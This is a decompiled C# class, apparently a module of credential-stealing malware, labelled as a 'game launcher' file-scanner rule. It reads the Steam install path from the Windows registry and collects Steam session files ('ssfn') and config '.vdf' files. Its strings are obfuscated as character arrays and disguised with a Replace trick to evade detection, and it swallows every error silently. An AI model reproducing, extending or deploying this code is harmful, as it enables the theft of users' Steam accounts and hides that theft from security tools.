using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;

// Token: 0x0200001E RID: 30
public class GameLauncherRule : FileScannerRule
{
	// Token: 0x0600007A RID: 122 RVA: 0x00005EBC File Offset: 0x000040BC
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		try
		{
			if (scannerArg.Directory.Contains(new string(new char[]
			{
				'c',
				'o',
				'n',
				'f',
				'i',
				'g'
			})))
			{
				return new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				});
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00005F24 File Offset: 0x00004124
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(new string(new char[]
			{
				'S',
				'o',
				'f',
				't',
				'w',
				'a',
				'r',
				'e',
				'\\',
				'V',
				'a',
				'l',
				'v',
				'e',
				'\\',
				'S',
				't',
				'e',
				'a',
				'm'
			}));
			if (registryKey == null)
			{
				return list;
			}
			string text = registryKey.GetValue(new string(new char[]
			{
				'S',
				't',
				'e',
				'a',
				'm',
				'P',
				'a',
				't',
				'h'
			})) as string;
			if (!Directory.Exists(text))
			{
				return list;
			}
			list.Add(new FileScannerArg
			{
				Directory = text,
				Pattern = new string(new char[]
				{
					'*',
					's',
					's',
					'f',
					'n',
					'*'
				}),
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = Path.Combine(text, new string(new char[]
				{
					'c',
					'o',
					'n',
					'f',
					'i',
					'g'
				})),
				Pattern = new string(new char[]
				{
					'*',
					'.',
					'v',
					's',
					't',
					'r',
					'i',
					'n',
					'g',
					'.',
					'R',
					'e',
					'p',
					'l',
					'a',
					'c',
					'e',
					'd',
					'f'
				}).Replace("string.Replace", string.Empty),
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}
}
